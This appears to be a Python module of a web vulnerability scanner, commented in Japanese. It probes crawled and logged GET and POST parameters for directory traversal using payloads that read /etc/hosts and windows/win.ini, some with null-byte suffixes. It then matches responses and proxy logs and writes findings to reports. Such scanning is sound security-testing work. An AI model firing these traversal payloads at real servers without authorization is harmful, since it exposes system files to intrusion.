from time import sleep
from requests_html import HTMLSession
from urllib.parse import unquote
import sqlite3
import method
import json

# request_htmlの設定
session = HTMLSession()

# プロキシ設定
proxies = {"http":"http://127.0.0.1:8888"}

# クローリングしたurlの場合の関数
def crawling_request(url_list):
    # 初期設定
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0"}

    # url_list分のrequest
    for url in url_list:
        # GETmethod_list設定
        getmethod = method.getmethod(url)
        idx = getmethod[0]
        getmethod_list = getmethod[1]

        #getmethodが診断できる値か判定
        if(len(getmethod_list)%2!=0):
            return

        # 変数nを設定
        n = 0

        # pathリスト作成
        path_list = ['../../../../../../../../../etc/hosts','../../../../../../../../../etc/hosts%00','../../../../../../../../../windows/win.ini','../../../../../../../../../windows/win.ini%00']

        #textリスト作成
        text_list = ['127.0.0.1','localhost','[extensions]','[fonts]']

        # 診断開始
        while(n<len(getmethod_list)):
            # 対象のパラメータでない場合、診断しない
            if('.' not in getmethod_list[n+1]):
                n = n + 2
                continue

            # 攻撃開始
            for path_n in range(len(path_list)):
                # 正規のgetmethod_listをコピー
                defacing_getmethod_list = getmethod_list.copy()

                # getmethod改ざん
                defacing_getmethod_list[n+1] = path_list[path_n]
                defacing_getmethod = '?'
                m = 0
                while(m<len(defacing_getmethod_list)):
                    defacing_getmethod += defacing_getmethod_list[m]+'='+defacing_getmethod_list[m+1]
                    m = m+2
                    if(m<len(defacing_getmethod_list)):
                        defacing_getmethod += '&'

                # request送信
                try:
                    response1 = session.get(url[:idx]+defacing_getmethod,headers=headers,proxies=proxies)
                except Exception:
                    continue
                sleep(1)

                #診断に使用する文字列を設定
                if(path_n<2):
                    text1 = text_list[0]
                    text2 = text_list[1]
                else:
                    text1 = text_list[2]
                    text2 = text_list[3]

                # レスポンスに127.0.0.1もしくはlocalhostが含まれている場合、脆弱性ありと判定
                if(response1.html.search(text1)!=None or response1.html.search(text2)!=None):
                    # logファイルからrequestheader取得
                    f = open(r"C:\VulnDiag\nginx\nginx-1.20.1\logs\http.log", 'r+', encoding='UTF-8')
                    log = f.readlines()

                    # logファイルのリストを降順にする
                    log.reverse()

                    # logを降順で読み込む
                    for line in log:
                        # lineの改行コード削除
                        onelog = line.strip()

                        # log_listを作成
                        log_list = onelog.split('%log%')

                        #HTTPメソッドの確認
                        if("GET" not in log_list[0]):
                            continue

                        # log_url設定
                        log_url = method.url(log_list[0])

                        # 対象logか判定
                        if(unquote(url[:idx]+defacing_getmethod)==unquote(log_url) and "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0"==log_list[2]):
                            f.truncate(0)
                            break

                    # report書き込み準備
                    response_list = dict(response1.headers)
                    name = "ディレクトリ・トラバーサル"+str(path_n+1)

                    # レポート出力
                    method.report(str(log_url),getmethod_list[n],list(log_list),response_list,str(log_list[14]),response1.text,name)
                    break
            # 変数nをwhileが周るごとに+2する
            n = n+2


# POSTの関数
def POST_request(request_list):
    # url設定
    url = method.url(request_list[0])

    #header設定
    headers = method.headers(request_list)

    # cookies設定
    cookies = method.cookies(request_list[11])

    # request_bodyの設定
    request_body = method.request_body(request_list[12])
    body_list = request_body[0]
    payload = request_body[1]

    #requestbodyが診断できる値か判定
    if(len(body_list)%2!=0):
        return

    # 変数nを設定
    n = 0

    # pathリスト作成
    path_list = ['../../../../../../../../../etc/hosts','../../../../../../../../../etc/hosts%00','../../../../../../../../../windows/win.ini','../../../../../../../../../windows/win.ini%00']

    #textリスト作成
    text_list = ['127.0.0.1','localhost','[extensions]','[fonts]']

    # defacing_payloadを作成
    defacing_payload={}

    # 診断開始
    while(n<len(body_list)):
        # 対象のパラメータでない場合、診断しない
        if('.' not in payload[body_list[n]]):
            n = n + 2
            continue

        # 攻撃開始
        for path_n in range(len(path_list)):
            # 正規のbodyをコピー
            defacing_payload = payload.copy()

            # body改ざん
            defacing_payload[body_list[n]] = path_list[path_n]

            # ContentTypeがjsonの場合、型を変更する
            if(request_list[6]=='application/json'):
                defacing_payload = json.dumps(defacing_payload)

            # request送信
            try:
                if(cookies!={}):
                    # cookie有
                    response1 = session.post(url,defacing_payload,headers=headers,cookies=cookies,proxies=proxies)
                else:
                    #cookie無
                    response1 = session.post(url,defacing_payload,headers=headers,proxies=proxies)
            except Exception:
                continue
            sleep(1)

            # ContentTypeがjsonの場合、型を変更する
            if(request_list[6]=='application/json'):
                defacing_payload = json.loads(defacing_payload)

            #診断に使用する文字列を設定
            if(path_n<2):
                text1 = text_list[0]
                text2 = text_list[1]
            else:
                text1 = text_list[2]
                text2 = text_list[3]

            # レスポンスに127.0.0.1もしくはlocalhostが含まれている場合、脆弱性ありと判定
            if(response1.html.search(text1)!=None or response1.html.search(text2)!=None):
                # logファイルからrequestheader取得
                f = open(r"C:\VulnDiag\nginx\nginx-1.20.1\logs\http.log", 'r+', encoding='UTF-8')
                log = f.readlines()

                # logファイルのリストを降順にする
                log.reverse()

                # logを降順で読み込む
                for line in log:
                    # lineから改行コードを取り除く
                    onelog = line.strip()

                    # log_listを作成
                    log_list = onelog.split('%log%')

                    # log_payloadの設定
                    request_body = method.request_body(unquote(log_list[12]))
                    log_payload = request_body[1]

                    # cookie_listの設定
                    log_cookie_list = log_list[13].replace('; ','%cookie%').split('%cookie%')
                    request_cookie_list = request_list[11].replace('; ','%cookie%').split('%cookie%')

                    # 対象logか判定
                    if(request_list[0]==log_list[0] and request_cookie_list.sort()==log_cookie_list.sort() and defacing_payload==log_payload):
                        f.truncate(0)
                        break

                # report書き込み準備
                response_list = dict(response1.headers)
                name = "ディレクトリ・トラバーサル"+str(path_n+1)

                # レポート出力
                method.report(url,body_list[n],list(log_list),response_list,str(log_list[14]),response1.text,name)
                break

        # 変数nをwhileが周るごとに+2する
        n = n + 2


# GETの関数
def GET_request(request_list):
    #url設定
    url = method.url(request_list[0])

    #headerを設定
    headers = method.headers(request_list)

    # cookies設定
    cookies = method.cookies(request_list[11])

    # GETmethod_list設定
    getmethod = method.getmethod(url)
    idx = getmethod[0]
    getmethod_list = getmethod[1]

    #getmethodが診断できる値か判定
    if(len(getmethod_list)%2!=0):
        return

    # 変数nを設定
    n = 0

    # pathリスト作成
    path_list = ['../../../../../../../../../etc/hosts','../../../../../../../../../etc/hosts%00','../../../../../../../../../windows/win.ini','../../../../../../../../../windows/win.ini%00']

    #textリスト作成
    text_list = ['127.0.0.1','localhost','[extensions]','[fonts]']

    # 診断開始
    while(n<len(getmethod_list)):
        # 対象のパラメータでない場合、診断しない
        if('.' not in getmethod_list[n+1]):
            n = n + 2
            continue

        # 攻撃開始
        for path_n in range(len(path_list)):
            # 正規のgetmethod_listをコピー
            defacing_getmethod_list = getmethod_list.copy()

            # getmethod改ざん
            defacing_getmethod_list[n+1] = path_list[path_n]
            defacing_getmethod = '?'
            m = 0
            while(m<len(defacing_getmethod_list)):
                defacing_getmethod += defacing_getmethod_list[m]+'='+defacing_getmethod_list[m+1]
                m = m+2
                if(m<len(defacing_getmethod_list)):
                    defacing_getmethod += '&'

            # request送信
            try:
                if(cookies!={}):
                    # cookie有
                    response1 = session.get(url[:idx]+defacing_getmethod,headers=headers,cookies=cookies,proxies=proxies)
                else:
                    # cookie無
                    response1 = session.get(url[:idx+1]+defacing_getmethod,proxies=proxies)
            except Exception:
                continue
            sleep(1)

            #診断に使用する文字列を設定
            if(path_n<2):
                text1 = text_list[0]
                text2 = text_list[1]
            else:
                text1 = text_list[2]
                text2 = text_list[3]

            # レスポンスに127.0.0.1もしくはlocalhostが含まれている場合、脆弱性ありと判定
            if(response1.html.search(text1)!=None or response1.html.search(text2)!=None):
                # logファイルからrequestheader取得
                f = open(r"C:\VulnDiag\nginx\nginx-1.20.1\logs\http.log", 'r+', encoding='UTF-8')
                log = f.readlines()

                # logファイルのリストを降順にする
                log.reverse()

                # logを降順で読み込む
                for line in log:
                    # lineの改行コード削除
                    onelog = line.strip()

                    # log_listを作成
                    log_list = onelog.split('%log%')

                    #HTTPメソッドの確認
                    if("GET" not in log_list[0]):
                        continue

                    # log_url設定
                    log_url = method.url(log_list[0])

                    # cookie_listの設定
                    log_cookie_list = log_list[13].replace('; ','%cookie%').split('%cookie%')
                    request_cookie_list = request_list[11].replace('; ','%cookie%').split('%cookie%')

                    # 対象logか判定
                    if(unquote(url[:idx]+defacing_getmethod)==unquote(log_url) and request_cookie_list.sort()==log_cookie_list.sort()):
                        f.truncate(0)

                # report書き込み準備
                response_list = dict(response1.headers)
                name = "ディレクトリ・トラバーサル"+str(path_n+1)

                # レポート出力
                method.report(str(log_url),getmethod_list[n],list(log_list),response_list,str(log_list[14]),response1.text,name)
                break

        # 変数nをwhileが周るごとに+2する
        n = n+2


# メイン
def main():
    # データベース名を設定
    db_name = 'C:/VulnDiag/pg/db_http.db'

    # db_nameのデータベースがなければ作成してから接続する
    con = sqlite3.connect(db_name)

    # sqliteを操作するカーソルオブジェクトを作成
    cur = con.cursor()

    # crawlingにアクセス
    cur.execute('SELECT url FROM crawling WHERE flag = 2')
    url_list = cur.fetchall()

    # httpにアクセス
    cur.execute('SELECT DISTINCT First_Row,Host,User_Agent,Accept,Accept_Language,Accept_Encoding,Content_Type,Origin,Connection,Referer,Upgrade_Insecure_Requests,Cookies,Request_Body FROM http')
    request_list = cur.fetchall()

    # データベースclose
    cur.close()
    con.close()

    # crawlingしたurlで診断
    target_url_list = [s for s in url_list if '?' in s]
    crawling_request(target_url_list)

    # request_listをwhile
    for n in range(len(request_list)):
        # urlの抜き出し
        url = request_list[n][0].split(' ')[1]
        final_path = url.split('/')[-1]
        #対象のurlか判定
        if('.' in final_path and '?' in final_path):
            if("POST" in request_list[n][0]):
                POST_request(request_list[n])
            else:
                GET_request(request_list[n])


if __name__ == "__main__":
    main()